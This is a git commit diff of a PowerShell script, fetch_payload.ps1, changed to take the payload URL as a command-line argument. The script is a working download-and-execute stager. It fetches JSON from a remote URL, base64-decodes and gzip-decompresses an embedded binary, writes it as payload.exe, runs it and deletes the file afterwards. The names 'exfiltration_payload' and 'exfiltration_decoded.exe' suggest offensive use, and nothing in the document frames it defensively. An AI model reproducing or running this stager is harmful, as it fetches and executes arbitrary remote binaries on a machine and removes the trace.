219bdfca039a24ca24e64167f474bc3532bb5d16
Rajeev KARUVATH <razorrajeev@gmail.com>
2022-03-12 18:12:21 -0500

    payload URL as argument

--- fetch_payload.ps1
+++ fetch_payload.ps1
@@ -1,4 +1,4 @@
-$fetched_data = Invoke-RestMethod -Uri "http://localhost:8000/exfiltration_payload.json"
+$fetched_data = Invoke-RestMethod -Uri $args[0]
 
 $parsedBase64payload = [System.Convert]::FromBase64String($fetched_data.payloadContent)
 $initialMemoryStream = New-Object System.IO.MemoryStream
@@ -6,7 +6,7 @@ $initialMemoryStream.Write($parsedBase64payload, 0, $parsedBase64payload.Length)
 $initialMemoryStream.Seek(0,0) | Out-Null
 $decompressed_binary = New-Object System.IO.BinaryReader(New-Object System.IO.Compression.GZipStream($initialMemoryStream, [System.IO.Compression.CompressionMode]::Decompress))
 $decompressed_binary_bytes = $decompressed_binary.ReadBytes($fetched_data.payloadSize)
-$filename = ".\exfiltration_decoded.exe"
+$filename = ".\payload.exe"
 Set-Content -Encoding Byte -Path $filename -Value $decompressed_binary_bytes
 Invoke-Expression "& $filename"
 Remove-Item $filename
